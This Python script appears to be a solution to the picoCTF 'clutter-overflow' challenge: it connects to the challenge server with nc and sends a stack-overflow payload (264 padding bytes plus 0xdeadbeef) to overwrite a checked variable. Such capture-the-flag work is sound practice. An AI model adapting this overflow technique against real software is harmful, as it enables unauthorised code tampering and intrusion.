import subprocess as sp
import sys
from   time import sleep

prompt_string  = "What do you see?"
success_string = "how did that happen?"

def terminated_read( fd, terminators ):
    buf = []
    while True:
        r = fd.read( 1 ).decode('utf-8')
        buf += r
        if r in terminators:
            break;
    return ''.join( buf )

def submit_input( process, input ):
    process.stdin.write( input + b'\n' )
    process.stdin.flush()

def read_prompt( process ):
    output = ''
    while prompt_string not in output:
        output = terminated_read( process.stdout, "?" ).strip()
        print( output )
        if success_string in output:
            while True:
                print( proc.stdout.read( 100 ).decode('utf-8') )

                # This makes sure it doesn't keep printing a bunch of blank lines
                sleep( 1 )

    return True

if __name__ == '__main__':
    # ./vuln1 and the following input were borrowed from the "clutter-overflow" challenge in picoCTF
    #app = ['./vuln1']
    app = ['nc', 'mars.picoctf.net', '31890']

    # This application takes in an optional argument of the application to exploit
    if len( sys.argv ) > 1:
        app = sys.argv[1:]

    # Communicate with the subprocess
    proc = sp.Popen(app, shell=False, bufsize=0,
                    stdin = sp.PIPE,
                    stdout = sp.PIPE,
                    stderr = sp.PIPE)

    # This converts a hex number to a little-endian byte string
    n = 0xdeadbeef
    n = n.to_bytes( ( n.bit_length() + 7 ) // 8, 'little' ) or b'\0'

    # This overflows the stack, then overwrites the check that compares a variable against "0xdeadbeef"
    submit_input( proc, b'a' * 264 + n )

    while True:
        read_prompt( proc )
